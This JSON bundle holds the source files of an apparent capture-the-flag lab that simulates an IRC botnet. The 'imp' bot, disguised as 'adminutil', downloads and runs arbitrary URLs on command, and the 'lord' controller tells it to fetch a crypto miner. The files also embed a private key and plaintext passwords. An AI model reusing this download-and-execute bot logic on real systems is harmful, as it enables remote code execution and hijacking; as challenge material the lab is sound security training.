{
    "docker-compose.yml": "version: '2.4'\n\nx-limits: &limits\n    pids_limit: 1024\n    cpu_shares: 256\n    mem_limit: 512m\n    logging:\n        options:\n            max-size: 10m\n            max-file: '3'\n\nservices:\n    router:\n        <<: *limits\n        build: ./router\n        image: naumachia/altf4.router\n        hostname: router.initech.naum\n        networks:\n            default:\n                ipv4_address: 172.30.0.1\n            mordor:\n                ipv4_address: 172.30.20.1\n        sysctls:\n            net.ipv4.ip_forward: 1\n        restart: unless-stopped\n\n    ircd:\n        <<: *limits\n        build: ./ircd\n        image: naumachia/altf4.ircd\n        networks:\n            mordor:\n                ipv4_address: 172.30.20.10\n                aliases:\n                    - irc.hades.naum\n        hostname: mail.initech.naum\n        expose:\n            - 6667\n            - 6697\n        restart: unless-stopped\n\n    imp0:\n        <<: *limits\n        build: \n            context: ./imp\n            args:\n                OWNER: blumbergh\n        image:  naumachia/altf4.imp0\n        hostname: blumbergh.initech.naum\n        environment:\n            NICK: imp63a3\n            SERVER: 172.30.20.10\n            PASSWORD: \"underling\"\n        cap_add:\n            # NET_ADMIN is not strictly needed, but helpful beecasue ettercap\n            # and some other tools will not work without it\n            - NET_RAW \n            - NET_ADMIN\n        networks:\n            default:\n                ipv4_address: 172.30.0.2\n        restart: unless-stopped\n\n    imp1:\n        <<: *limits\n        build: \n            context: ./imp\n            args:\n                OWNER: miltonw\n        image:  naumachia/altf4.imp1\n        hostname: miltonw.initech.naum\n        environment:\n            NICK: impac66\n            SERVER: 172.30.20.10\n            PASSWORD: \"underling\"\n        networks:\n            mordor:\n                ipv4_address: 172.30.20.3\n        cap_add:\n            - NET_RAW \n            - NET_ADMIN\n        restart: unless-stopped\n\n    lord:\n        <<: *limits\n        build:\n            context: ./lord\n            network: host\n            args:\n                OWNER: eugene\n        image:  naumachia/altf4.lord\n        hostname: eugene.initech.naum\n        environment:\n            NICK: baal\n            SERVER: 172.30.20.10\n            HTTPD_PORT: 8080\n            HTTPD_ADDR: 172.30.20.2\n            CTF_FLAG: gigem{command_and_out_of_control}\n            PASSWORD: \"suckitinnotech\"\n            OPER_PASSWORD: \"darksecret\"\n        networks:\n            mordor:\n                ipv4_address: 172.30.20.2\n        restart: unless-stopped\n\nnetworks:\n    default:\n        driver: l2bridge\n        ipam:\n            driver: static\n            config:\n                - subnet: 172.30.0.0/28\n        driver_opts:\n            l2bridge.gateway: 172.30.0.1\n\n    mordor:\n        driver: l2bridge\n        ipam:\n            driver: static\n            config:\n                - subnet: 172.30.20.0/28\n        driver_opts:\n            l2bridge.gateway: 172.30.20.1\n",
    "imp\\Dockerfile": "FROM python:stretch\n\nRUN apt-get update && \\\n    apt-get install -y nmap libpcap0.8 bash netcat\n\nCOPY ./requirements.txt ./requirements.txt\nRUN pip install -r ./requirements.txt && rm ./requirements.txt\n\nCOPY ./imp.py /usr/local/bin/adminutil\nRUN chmod +x /usr/local/bin/adminutil\n\nARG OWNER\nRUN useradd -ms /bin/bash $OWNER\n\nCMD [\"python\", \"/usr/local/bin/adminutil\"]\n",
    "imp\\imp.py": "#!/bin/env python\n# coding: utf-8\n\nimport irc.client\nimport logging\nimport multiprocessing\nimport os\nimport re\nimport scapy.all as scapy\nimport shlex\nimport socket\nimport subprocess\nimport sys\nimport tempfile\nimport threading\nimport time\nimport urllib.parse\nimport urllib.request\n\nSERVER = os.environ.get(\"SERVER\")\nCHANNEL = os.environ.get(\"CHANNEL\", \"#void\")\nUSERNAME = os.environ.get(\"USERNAME\", \"imp\")\nPASSWORD = os.environ.get(\"PASSWORD\", \"password\")\nNICK = os.environ.get(\"NICK\", \"imp0\")\nLOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')\nQUANTUM = float(os.environ.get(\"QUANTUM\", 0.5))\n\nlogging.basicConfig(format=\"[%(levelname)7s %(asctime)s %(name)s] %(message)s\", datefmt=\"%m-%d %H:%M:%S\")\nlogger = logging.getLogger(NICK)\nlogger.setLevel(LOG_LEVEL)\n\nsocket.setdefaulttimeout(30)\n\ndef parse_nick(string):\n    masked = irc.client.NickMask(string or '').nick\n    if not masked:\n        return None\n    return masked.lstrip('@')\n\ndef urlexec(url, args, stdout=None, stderr=None):\n    # Redirect stdout as this is intended to run in a fork.\n    sys.stdout = stdout or open(os.devnull, 'w')\n    sys.stderr = stderr or sys.stdout\n    os.dup2(sys.stdout.fileno(), 1)\n    os.dup2(sys.stderr.fileno(), 2)\n\n    req = urllib.request.Request(url=url, headers={\n        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',\n    })\n    resp = urllib.request.urlopen(req)\n\n    # Make and unlink a temporary file to execute from.\n    wr, name = tempfile.mkstemp()\n    try:\n        rd = open(name, 'rb')\n    finally:\n        os.unlink(name)\n\n    # Shuttle data into the temp file.\n    buf = resp.read(4096)\n    while buf:\n        os.write(wr, buf)\n        buf = resp.read(4096)\n    os.close(wr)\n\n    # Execute the program\n    arg0 = urllib.parse.urlparse(url).path\n    os.chmod(rd.fileno(), 0o700)\n    os.execve(rd.fileno(), (arg0,) + args, os.environ)\n\nclass ImpBot:\n    msgexp = re.compile(r'^\\+(?P<nick>\\w+),\\s*(?P<cmd>\\S+)(\\s+|$)(?P<args>.*)')\n\n    def __init__(self, server, nick, user=None, password=None, keepalive=30):\n        self.server = server\n        self.nick = nick\n        self.user = user\n        self.password = password\n        self.keepalive = keepalive\n        self.procs = []\n\n        logger.info(\"connecting with %s %s\", USERNAME, PASSWORD)\n        addr, port = server\n        self.reactor = irc.client.Reactor()\n        self.conn = self.reactor.server().connect(addr, port, nickname=nick, username=user, password=password)\n        self.conn.set_keepalive(keepalive)\n        self.register_handlers()\n\n    def run(self):\n        try:\n            while True:\n                self.reactor.process_once(timeout=QUANTUM)\n                if not self.conn.connected:\n                    logger.info(\"quitting: disconnected\")\n                    break\n                self.poll_procs()\n        finally:\n            self.conn.disconnect()\n\n    def poll_procs(self):\n        for proc, pipe in self.procs:\n            data = pipe.read()\n            if data is not None:\n                for line in data.decode().splitlines():\n                    line = line.strip()\n                    if line:\n                        self.conn.privmsg(CHANNEL, f\"> {line}\")\n            if proc.exitcode is not None:\n                self.conn.privmsg(CHANNEL, f\"done: {proc.exitcode}\")\n                pipe.close()\n        self.procs = [(proc, pipe) for proc, pipe in self.procs if proc.exitcode is None]\n\n    def register_handlers(self):\n        for key in dir(self):\n            match = re.fullmatch(r'(\\w+)_handler', key)\n            if match:\n                event = match.group(1)\n                self.reactor.add_global_handler(event, getattr(self, key))\n                logger.debug(\"registered %s for %s events\", key, event)\n\n    def payload(self, args):\n        split = shlex.split(args)\n        if not split:\n            return \"where shall I find my payload?\"\n\n        url, pargs = split[0], tuple(split[1:])\n        try:\n            urllib.parse.urlparse(url)\n        except ValueError:\n            return f\"{url} is not a valid URL\"\n\n        # Make a pipe to communicate the process results.\n        r, w = os.pipe()\n        os.set_inheritable(w, True)\n        os.set_blocking(r, False)\n        recv, send = os.fdopen(r, 'rb'), os.fdopen(w, 'wb')\n\n        try:\n            p = multiprocessing.Process(target=urlexec, args=(url, pargs, send))\n            p.start()\n        except (OSError, multiprocessing.ProcessError) as err:\n            return f\"failed to start the process: {err!r}\"\n\n        self.procs.append((p, recv))\n        return \"running...\"\n\n    def purge(self):\n        for proc, _ in self.procs:\n            proc.terminate()\n\n    def pubmsg_handler(self, conn, event):\n        if not event.target == CHANNEL:\n            return\n\n        msg = self.msgexp.match(event.arguments[0])\n        if not msg or msg['nick'] != self.nick:\n            return\n\n        lord = parse_nick(event.source)\n        if msg['cmd'] == 'payload':\n            result = self.payload(msg['args'])\n            conn.privmsg(CHANNEL, f\"{lord}, {result}\")\n        elif msg['cmd'] == 'purge':\n            if self.procs:\n                self.purge()\n            else:\n                conn.privmsg(CHANNEL, f\"{lord}, there are no running processes\")\n        else:\n            conn.privmsg(CHANNEL, f\"{lord}, '{msg['cmd']}' is unknown to me.\")\n\n    def all_events_handler(self, _, event):\n        if event.type not in (\"all_raw_messages\", \"motd\"):\n            logger.info(\"%s\", event)\n\n    def join_handler(self, conn, event):\n        if parse_nick(event.source) == self.nick and event.target == CHANNEL:\n            conn.privmsg(CHANNEL, \"hi, all\")\n\n    def welcome_handler(self, conn, _):\n        conn.join(CHANNEL)\n\ndef main():\n    while True:\n        try:\n            ImpBot((SERVER, 6667), nick=NICK, user=USERNAME, password=PASSWORD).run()\n        except (ConnectionError, irc.client.ServerConnectionError, OSError):\n            logger.exception(\"error while running ImpBot\")\n            time.sleep(10)\n        except KeyboardInterrupt:\n            logger.info(\"shutting down: recieved SIGINT\")\n            break\n\nif __name__ == \"__main__\":\n    main()\n",
    "imp\\requirements.txt": "irc==17.0\nsnare==0.2.4\n",
    "ircd\\Dockerfile": "FROM debian\n\nARG IRCD_REPO_URL=https://github.com/ircd-hybrid/ircd-hybrid.git\nARG IRCD_REPO_CHECKOUT=8.2\nARG IRCD_OPTIONS=--prefix=/usr/ircd\n\nCOPY ./make-ircd.sh ./make-ircd.sh\n\n# Install build tools, build from source, and remove tools in one RUN.\nRUN apt-get update && \\\n    apt-get install -y libssl-dev git autoconf automake cmake && \\\n    /bin/sh ./make-ircd.sh && \\\n    apt-get purge -y git autoconf automake cmake && \\\n    rm -rf /var/lib/apt/lists/* ./make-ircd.sh \n\nCOPY ./etc /usr/ircd/etc\nRUN chown -R irc:irc /usr/ircd\n\nEXPOSE 6667 6697\n\nUSER irc\nCMD [\"/usr/ircd/bin/ircd\", \"-foreground\"]\n",
    "ircd\\make-ircd.sh": "#!/bin/sh\n\nset -ex\n\necho \"Building ircd-hybrid from $IRCD_REPO_URL\"\n\nmkdir build\ncd build\n\ngit clone \"$IRCD_REPO_URL\" ircd\nif [ -z \"$(ls ircd)\" ]; then\n    echo \"BUILD FAILED: Could not clone $IRCD_REP_URL\"\n    exit 1\nfi\n\ncd ircd\n\nif [ -n \"$IRCD_REPO_CHECKOUT\" ]; then\n    git checkout \"$IRCD_REPO_CHECKOUT\"\nfi\n\n./configure $IRCD_OPTIONS && make && make install\n\ncd ../..\n\nrm -rf build\n",
    "ircd\\etc\\ircd.conf": "serverinfo {\n    # Identifiers\n    sid = \"0HA\";\n    name = \"irc.hades.naum\";\n    description = \"Hades IRC server\";\n\n    # Network\n    network_name = \"hades\";\n    network_desc = \"IRC community of only the badest hackers\";\n    hub = no;\n\n    # Crytography\n    rsa_private_key_file = \"/usr/ircd/etc/key/irc.hades.naum.key\";\n    ssl_certificate_file = \"/usr/ircd/etc/key/irc.hades.naum.crt\";\n    ssl_cipher_list = \"ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA:AES256-SHA\";\n    ssl_message_digest_algorithm = \"sha256\";\n};\n\nadmin {\n    name = \"w0rmw00d\";\n    description = \"Dark Lord Supreme\";\n};\n\n# Class for unprivileged human users.\nclass {\n    name = \"guests\";\n    ping_time = 30 seconds;\n    sendq = 64 kbytes;\n};\n\n# Class for bots.\nclass {\n    name = \"imps\";\n    ping_time = 30 seconds;\n    sendq = 64 kbytes;\n};\n\n# Class for privileges (op) human users.\nclass {\n    name = \"lords\";\n    ping_time = 30 seconds;\n    sendq = 64 kbytes;\n    max_number = 25;\n};\n\nlisten {\n    port = 6667;\n\n    flags = ssl;\n    port = 6697;\n};\n\nauth {\n    user = \"~eugene@*\";\n    class = \"lords\";\n\n    password = \"suckitinnotech\";\n\n    flags = need_password, can_flood, no_tilde, resv_exempt;\n};\n\nauth {\n    user = \"*@*\";\n    class = \"imps\";\n\n    password = \"underling\";\n\n    flags = need_password, can_flood, no_tilde;\n};\n\noperator {\n    name = \"baal\";\n    user = \"eugene@*\";\n\n    password = \"darksecret\";\n    encrypted = no;\n\n#    ssl_certificate_fingerprint = \"4C62287BA6776A89CD4F8FF10A62FFB35E79319F51AF6C62C674984974FCCB1D\";\n    ssl_connection_required = no;\n\n    class = \"lords\";\n\n    whois = \"is a Dark Lord of Hades\";\n    /*\n    * umodes: the default usermodes opers get when they /oper or /challenge.\n    * If defined, it will override oper_umodes settings in general {}.\n    * Available user modes:\n    *\n    * +b - bots         - See bot and drone flooding notices\n    * +c - cconn        - Client connection/quit notices\n    * +D - deaf         - Don't receive channel messages\n    * +d - debug        - See debugging notices\n    * +e - external     - See remote server connection and split notices\n    * +F - farconnect   - Remote client connection/quit notices\n    * +f - full         - See auth {} block full notices\n    * +G - softcallerid - Server Side Ignore for users not on your channels\n    * +g - callerid     - Server Side Ignore (for privmsgs etc)\n    * +H - hidden       - Hides operator status to other users\n    * +i - invisible    - Not shown in NAMES or WHO unless you share a channel\n    * +j - rej          - See rejected client notices\n    * +k - skill        - See server generated KILL messages\n    * +l - locops       - See LOCOPS messages\n    * +n - nchange      - See client nick changes\n    * +p - hidechans    - Hides channel list in WHOIS\n    * +q - hideidle     - Hides idle and signon time in WHOIS\n    * +R - nononreg     - Only receive private messages from registered clients\n    * +s - servnotice   - See general server notices\n    * +u - unauth       - See unauthorized client notices\n    * +w - wallop       - See server generated WALLOPS\n    * +y - spy          - See LINKS, STATS, TRACE notices etc.\n    * +z - operwall     - See oper generated WALLOPS\n    */\n    umodes = locops, servnotice, wallop;\n\n    /*\n    * flags: controls the activities and commands an oper is\n    * allowed to do on the server. All flags default to 'no'.\n    * Available flags:\n    *\n    * admin          - gives administrator privileges        | ('A' flag)\n    * close          - allows CLOSE                          | ('B' flag)\n    * connect        - allows local CONNECT                  | ('C' flag)\n    * connect:remote - allows remote CONNECT                 | ('D' flag)\n    * die            - allows DIE                            | ('E' flag)\n    * dline          - allows DLINE                          | ('F' flag)\n    * globops        - allows GLOBOPS                        | ('G' flag)\n    * join:resv      - allows to JOIN resv {} channels       | ('H' flag)\n    * kill           - allows to KILL local clients          | ('I' flag)\n    * kill:remote    - allows remote users to be /KILL'd     | ('J' flag)\n    * kline          - allows KLINE                          | ('K' flag)\n    * locops         - allows LOCOPS                         | ('L' flag)\n    * module         - allows MODULE                         | ('M' flag)\n    * nick:resv      - allows to use NICK on resv {} nicks   | ('N' flag)\n    * opme           - allows OPME                           | ('O' flag)\n    * rehash         - allows oper to REHASH config          | ('P' flag)\n    * rehash:remote  - allows oper to remotely REHASH config | ('Q' flag)\n    * remoteban      - allows remote KLINE/UNKLINE           | ('R' flag)\n    * restart        - allows RESTART                        | ('S' flag)\n    * resv           - allows RESV                           | ('T' flag)\n    * set            - allows SET                            | ('U' flag)\n    * squit          - allows local SQUIT                    | ('V' flag)\n    * squit:remote   - allows remote SQUIT                   | ('W' flag)\n    * undline        - allows UNDLINE                        | ('X' flag)\n    * unkline        - allows UNKLINE                        | ('Y' flag)\n    * unresv         - allows UNRESV                         | ('Z' flag)\n    * unxline        - allows UNXLINE                        | ('a' flag)\n    * wallops        - allows WALLOPS                        | ('b' flag)\n    * xline          - allows XLINE                          | ('c' flag)\n    */\n    flags = admin, connect, connect:remote, die, globops, kill, kill:remote,\n        kline, module, rehash, restart, set, unkline, unxline, xline, join:resv, nick:resv;\n};\n\nchannel {\n    # Disable non-printable channel names\n    disable_fake_channels = yes;\n\n    # KNOCK interval per channel\n    knock_delay_channel = 1 minute;\n\n    # Max channels per users\n    max_channels = 25;\n};\n\ngeneral {\n    # Make users invisible on connect\n    invisible_on_connect = no;\n\n    # Kill by old nick if changed within 30 seconds\n    kill_chase_time_limit = 30 seconds;\n\n    # Disable ident server usage. Because it's a dumb security measure.\n    disable_auth = yes;\n\n    # Consider more than 10 messages in a 10 second window to be a flood.\n    default_floodcount = 10;\n    default_floodtime = 1 second;\n\n    anti_nick_flood = yes;\n    max_nick_changes = 5;\n    max_nick_time = 20 seconds;\n\n    away_count = 2;\n    away_time = 10 seconds;\n\n    failed_oper_notice = yes;\n\n    # Warn if a server is more than 3 seconds out of sync.\n    # Drop the connection if more than 15.\n    ts_warn_delta = 3 seconds;\n    ts_max_delta = 15 seconds;\n\n    # Warn if a server tries to connect without a connect block.\n    warn_no_connect_block = yes;\n\n    # stats_u_oper_only: make stats u (uptime) oper only.\n    stats_u_oper_only = yes;\n\n    /* no_oper_flood: increase flood limits for opers. */\n    no_oper_flood = yes;\n\n    /*\n     * user modes configurable: a list of user modes for the options below\n     *\n     * +b - bots         - See bot and drone flooding notices\n     * +c - cconn        - Client connection/quit notices\n     * +D - deaf         - Don't receive channel messages\n     * +d - debug        - See debugging notices\n     * +e - external     - See remote server connection and split notices\n     * +F - farconnect   - Remote client connection/quit notices\n     * +f - full         - See auth {} block full notices\n     * +G - softcallerid - Server Side Ignore for users not on your channels\n     * +g - callerid     - Server Side Ignore (for privmsgs etc)\n     * +H - hidden       - Hides operator status to other users\n     * +i - invisible    - Not shown in NAMES or WHO unless you share a channel\n     * +j - rej          - See rejected client notices\n     * +k - skill        - See server generated KILL messages\n     * +l - locops       - See LOCOPS messages\n     * +n - nchange      - See client nick changes\n     * +p - hidechans    - Hides channel list in WHOIS\n     * +q - hideidle     - Hides idle and signon time in WHOIS\n     * +R - nononreg     - Only receive private messages from registered clients\n     * +s - servnotice   - See general server notices\n     * +u - unauth       - See unauthorized client notices\n     * +w - wallop       - See server generated WALLOPS\n     * +y - spy          - See LINKS, STATS, TRACE notices etc.\n     */\n\n    /* oper_only_umodes: user modes only operators may set. */\n    oper_only_umodes = bots, cconn, debug, external, farconnect, full, hidden,\n        locops, nchange, rej, skill, spy, unauth;\n\n    /* oper_umodes: default user modes operators get when they successfully OPER. */\n    oper_umodes = bots, locops, servnotice, wallop;\n};\n\n/*\n * resv block to protect #sanctum\n */\nresv {\n\tmask = \"#sanctum\";\n\treason = \"Only lords may enter the sanctum!\";\n    exempt = \"lord*!*@*\";\n};\n\nresv {\n\tmask = \"lord*\";\n\treason = \"Only the chosen may adopt the title of lord!\";\n};\n\n/*\n * log {}:  contains information about logfiles.\n */\nlog {\n    /* Do you want to enable logging to ircd.log? */\n    use_logging = yes;\n\n    file {\n        type = oper;\n        name = \"/usr/ircd/var/log/ircd-hybrid-oper.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = user;\n        name = \"/usr/ircd/var/log/ircd-hybrid-user.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = kill;\n        name = \"/usr/ircd/var/log/ircd-hybrid-kill.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = kline;\n        name = \"/usr/ircd/var/log/ircd-hybrid-kline.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = dline;\n        name = \"/usr/ircd/var/log/ircd-hybrid-dline.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = xline;\n        name = \"/usr/ircd/var/log/ircd-hybrid-xline.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = resv;\n        name = \"/usr/ircd/var/log/ircd-hybrid-resv.log\";\n        size = 10 megabytes;\n    };\n\n    file {\n        type = debug;\n        name = \"/usr/ircd/var/log/ircd-hybrid-debug.log\";\n        size = 10 megabytes;\n    };\n};\n",
    "ircd\\etc\\ircd.motd": "                            ,-.\n       ___,---.__          /'|`\\          __,---,___\n    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.\n  ,'        |           ~'\\     /`~           |        `.\n /      ___//              `. ,'          ,  , \\___      \\\n|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n|   /          /\\_  `   .    |    ,      _/\\          \\   |\n\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /\n \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\n  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n     ``       /     \\    ,='/ \\`=.    /     \\       ''\n             |__   /|\\_,--.,-.--,--._/|\\   __|\n             /  `./  \\\\`\\ |  |  | /,//' \\,'  \\\n            /   /     ||--+--|--+-/-|     \\   \\\n           |   |     /'\\_\\_\\ | /_/_/`\\     |   |\n            \\   \\__, \\_     `~'     _/ .__/   /\n             `-._,-'   `-._______,-'   `-._,-'\n\nTURN BACK NOW!\n",
    "ircd\\etc\\key\\irc.hades.naum.crt": "-----BEGIN CERTIFICATE-----\nMIIDYjCCAkqgAwIBAgIJAISIvuBz2oulMA0GCSqGSIb3DQEBCwUAMEYxCzAJBgNV\nBAYTAkFVMQ4wDAYDVQQIDAVIYWRlczEOMAwGA1UECgwFSGFkZXMxFzAVBgNVBAMM\nDmlyYy5oYWRlcy5uYXVtMB4XDTE5MDEyMTE5MDcwM1oXDTE5MDIyMDE5MDcwM1ow\nRjELMAkGA1UEBhMCQVUxDjAMBgNVBAgMBUhhZGVzMQ4wDAYDVQQKDAVIYWRlczEX\nMBUGA1UEAwwOaXJjLmhhZGVzLm5hdW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQC2S4MlBwcY3cMDYOItZYKBLT8HtU0meQp/97Ju5XsZy4IVBY0l8B1C\nbRc9HNVN4CUZUZO8FSOijFyhsZTWjF/MVzRS7dYLQ2FnBHxzeQZHmAEWt5Fdxqwp\nKxa6X9yUGYa+sFPg6lla36xx0z5Uhj/REv++iJ41DpUmxtyyY2U6KEWuLvB2GdG4\nkyxJkeMMkHZffp7OkaYR8C94wb0qoSSA3X/kTZtj5zR6uJKqALyVKYescCj3QFEw\nynYaU/KQHgKK8SFq2ETzic8rjN0VXymXKJeRlj+lryi4+oTw4pTYgIpnDZPKTFMq\nxo/91hc0QAHdR+dzmD9/3RU1H3R1UJ+JAgMBAAGjUzBRMB0GA1UdDgQWBBRFstN4\nnCeXtHhoK5JVsxJhOwxBKzAfBgNVHSMEGDAWgBRFstN4nCeXtHhoK5JVsxJhOwxB\nKzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAkoxsPCdfX9jMC\n8hBA3O44oPaAbQF4lmCkosEMhPUWfysX/0rydx/sJDTw6YbDhtvAit29FeAtnAoX\n+divDcBtcKYwhbXF5tiMCNqXtl27WK7/gkrlsP1J1DC0laty5BRwIMO1vaW+slC2\nWDm0ql73qnU66F9Q6PyEN/uyUbfHcxdATscOyd4g4CrgOWZuAakNPDGcgv7fd15r\n8Gifc/fSA/W32gQ1RowSn+1Cuj7FGFFKosI3vYx9XkmEQcrEl8/lIezXPVbWAjd4\nlYt7Sxj+WtXFGx67vmCVILkwFOskWGMKplB+hti9ERWAsWipDgsXRET8XgN+ya/i\n0ZEYsSHM\n-----END CERTIFICATE-----\n",
    "ircd\\etc\\key\\irc.hades.naum.key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAtkuDJQcHGN3DA2DiLWWCgS0/B7VNJnkKf/eybuV7GcuCFQWN\nJfAdQm0XPRzVTeAlGVGTvBUjooxcobGU1oxfzFc0Uu3WC0NhZwR8c3kGR5gBFreR\nXcasKSsWul/clBmGvrBT4OpZWt+scdM+VIY/0RL/voieNQ6VJsbcsmNlOihFri7w\ndhnRuJMsSZHjDJB2X36ezpGmEfAveMG9KqEkgN1/5E2bY+c0eriSqgC8lSmHrHAo\n90BRMMp2GlPykB4CivEhathE84nPK4zdFV8plyiXkZY/pa8ouPqE8OKU2ICKZw2T\nykxTKsaP/dYXNEAB3Ufnc5g/f90VNR90dVCfiQIDAQABAoIBAAVoSAOZKcS7D0XS\nYeMm17AtP2ljH168yGrzVf+kHvqs5rbo6z7s2HFX+xB9AnbE51TQ7qjtl5kCwNyq\n/9c9YroU/CBZnbfHz+PWZjqmpGELSTz7RPybIBA4jvwIS+q4tx6A7HwHd48Sg3L8\n6SRotwvknGFye/7m59W2oGVKPX50FoeFMLz98SYXcJ2wwSqAhO87U85uyw/JceRZ\n2Qx9Tj2JbUOy2kWinmkVPXm4eI6RmIqqpt6GP5pGSr/YqdXIY1Izx2aqHrezBNd3\nX05GFFKgN+Q6ruUAUP8ZwKEEyVfkWU/lk7F0BW/JdjwfA8nRBYGu2kgoRJ+oGI93\nDUXybAECgYEA481yhAhans26avTVELV5ZCx0paX8/Z0SH8YNbmV78lUfkszqpgfN\nc+2dzu3c2hz5+0xAat5hjQ1j/nFVa7UTtcUg8MwN1DhTtsdgj4DevWv+Pam6khli\nrdcxS+zYQObEGI2MmG5o07BHBeWVvqP/V+xARGD5ydnTTkymeZpdJLECgYEAzNwI\nPcmTMmLeMWEy9silXhWBrAV5Ef5IPleca275pKC5V9+JJs9XYDIF4mxYQnbZR1ZI\n0wMgVGYMQi1JGozJ5CKju1w4WVCUT+ZAezDDgSVMyP2kfBNAGgl0+n6WIdBT/Wff\nUu1PGddZ378Q81F2eztBDqju8wZWp1xoja/MPlkCgYEAuYgaPG6RX8Uuju3YmkMz\nGuMaHc+SvPuwRzCGv+Lnj/bEQEuk0JSKQGDGpkIUHZB8CK+Rx3hW+wps5k5nw9E2\nvFRQ/80xdiZqB/NaMYZD4wKRjqctzM/gDrW08KF1f2ZzT4v5dix2M/Ld5W+XBi2L\nSZCgxxA0YLGH572F2IRgWAECgYA7C1wQuu2DAz35S4ON32zSPi6erwEjL4AQ/91k\nlZq8WVqyOgpktjP/1MsfZIzXszuStQrOTsNdr//ufvDoBxYVe+pnEQBotbHZiYqi\nNv7SVTbZY0mqPT4ngvxFSoDpBAuBKRQT6bP3xbrwozg2eQ9GG2D34bblMrl9CURV\nOgsLGQKBgQCdFq7SA/G5GCHXS3B+qIRmGKJ9QsBrbG+jLWHCnsozUjYAzr4T78xD\nGMaPa1jx3MDsA5mE7vSYgnBjaMBTC/T6kcOhJr/7zd07XhbATG02CIgxUOqLs2as\nmK/FtOKSJFh1nM7ZreMvt37P60BI6/0N/vSlZPUP7rrpaE+jfOw4SA==\n-----END RSA PRIVATE KEY-----\n",
    "lord\\Dockerfile": "FROM python:alpine\n\nRUN apk add --no-cache netcat-openbsd\n\nCOPY ./requirements.txt ./requirements.txt\nRUN pip install -r ./requirements.txt && rm ./requirements.txt\n\nARG DIR=/usr/local/lord\nCOPY ./lord.py $DIR/lord.py\nCOPY ./bin $DIR/bin\n\nARG OWNER\nRUN adduser -D $OWNER && \\\n    chown -R $OWNER:$OWNER $DIR && \\\n    chmod +x $DIR/bin/*\n\nUSER $OWNER\nCMD [\"python\", \"/usr/local/lord/lord.py\"]\n",
    "lord\\lord.py": "#!/bin/env python\n# coding: utf-8\n\nimport functools\nimport http.server\nimport irc.client\nimport logging\nimport os\nimport random\nimport re\nimport threading\nimport time\nimport socket\n\nSERVER = os.environ.get(\"SERVER\", \"localhost\")\nUSERNAME = os.environ.get(\"USERNAME\", \"eugene\")\nPASSWORD = os.environ.get(\"PASSWORD\", \"password\")\nOPER_PASSWORD = os.environ.get(\"OPER_PASSWORD\", \"password\")\nOPER_USERNAME = os.environ.get(\"OPER_USERNAME\", \"baal\")\nNICK = os.environ.get(\"NICK\", \"baal\")\nIMP_CHANNEL = os.environ.get(\"IMP_CHANNEL\", \"#void\")\nSECRET_CHANNEL = os.environ.get(\"SECRET_CHANNEL\", \"#sanctum\")\nTIMEOUT = float(os.environ.get(\"TIMEOUT\", 60))\nSOCKET_TIMEOUT = float(os.environ.get(\"SOCKET_TIMEOUT\", 30))\nLOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')\nCTF_FLAG = os.environ.get('CTF_FLAG', \"flag{}\")\nHTTPD_PORT = int(os.environ.get(\"HTTPD_PORT\", 8080))\nHTTPD_ADDR = os.environ.get(\"HTTPD_ADDR\")\nBTC_ADDR = os.environ.get(\"BTC_ADDR\", \"18kKGTd8CJYScHvD18JBoABzM68qgNqASG\")\n\nlogging.basicConfig(format=\"[%(levelname)7s %(asctime)s %(name)s] %(message)s\", datefmt=\"%m-%d %H:%M:%S\")\nlogger = logging.getLogger(NICK)\nlogger.setLevel(LOG_LEVEL)\n\nsocket.setdefaulttimeout(30)\n\nhttpbin = os.path.join(os.path.dirname(__file__), \"bin\")\nhttproot = f\"http://{HTTPD_ADDR}\" + (f\":{HTTPD_PORT}\" if HTTPD_PORT != 80 else '')\n\ndef parse_nick(string):\n    masked = irc.client.NickMask(string or '').nick\n    if not masked:\n        return None\n    return masked.lstrip('@')\n\nclass LordBot:\n    interval_mu = 20\n    interval_sigma = 5\n\n    def __init__(self, server, nick, user=None, password=None, keepalive=30):\n        self.server = server\n        self.nick = nick\n        self.user = user\n        self.password = password\n        self.imps = set()\n\n        logger.info(\"connecting with %s %s\", USERNAME, PASSWORD)\n        addr, port = server\n        self.reactor = irc.client.Reactor()\n        self.conn = self.reactor.server().connect(addr, port, nickname=nick, username=user, password=password)\n        self.conn.set_keepalive(keepalive)\n        self.register_handlers()\n\n    def pause(self):\n        time.sleep(max(random.gauss(1.5, 0.5), 0.25))\n\n    def run(self):\n        try:\n            while True:\n                until = time.time() + random.gauss(self.interval_mu, self.interval_sigma)\n                while time.time() < until:\n                    self.reactor.process_once(timeout=max(until - time.time(), 0))\n                    if not self.conn.connected:\n                        logger.info(\"quitting: disconnected\")\n                        break\n                if not self.conn.connected:\n                    break\n                self.poll_miners()\n        finally:\n            self.conn.disconnect()\n\n    def poll_miners(self):\n        for imp in self.imps:\n            self.pause()\n            self.conn.privmsg(IMP_CHANNEL, f\"+{imp}, payload {httproot}/stats\")\n\n    def register_handlers(self):\n        for key in dir(self):\n            match = re.fullmatch(r'(\\w+)_handler', key)\n            if match:\n                event = match.group(1)\n                self.reactor.add_global_handler(event, getattr(self, key))\n                logger.debug(\"registered %s for %s events\", key, event)\n\n    def reward(self, conn, name):\n        self.pause()\n        logger.info(\"challenger entered secret room with nick %s!\", name)\n        conn.privmsg(SECRET_CHANNEL, f\"{name}, who the hell are you?! {CTF_FLAG}\")\n\n    def register_imp(self, imp):\n        if imp in self.imps:\n            return\n\n        self.pause()\n        self.conn.privmsg(IMP_CHANNEL, f\"+{imp}, payload {httproot}/miner {BTC_ADDR}\")\n        self.imps.add(imp)\n\n    def 